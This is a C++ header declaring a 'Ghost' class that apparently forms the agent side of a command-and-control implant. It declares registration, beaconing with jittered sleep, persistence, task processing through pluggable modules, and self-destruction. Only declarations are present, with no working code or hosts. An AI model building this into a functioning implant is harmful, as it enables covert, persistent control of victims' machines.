#pragma once
#include <map>
#include <string>
#include <memory>
#include "interfaces/IModule.hpp"
#include "utils/SystemUtils.hpp"
#include "core/Config.hpp"
#include <nlohmann/json.hpp>

enum class TaskStatus {
    Pending,
    Sent,
    Done,
    Failed
};

NLOHMANN_JSON_SERIALIZE_ENUM(TaskStatus, {
    {TaskStatus::Failed, "failed"},
    {TaskStatus::Pending, "pending"},
    {TaskStatus::Sent, "sent"},
    {TaskStatus::Done, "done"}
});

class Ghost {
private:
    std::map<std::string, std::unique_ptr<IModule>> modules;

    std::string uuid;
    std::string hostname;
    int sleepInterval;
    int jitterPercent;
    
    nlohmann::json pendingResults;

    void processTask(const nlohmann::json& task);
    void sleepWithJitter();
public:
    Ghost();

    void run();
    bool reg();
    bool persist();
    bool beacon();
    void cleanup();
    void destroy();
};
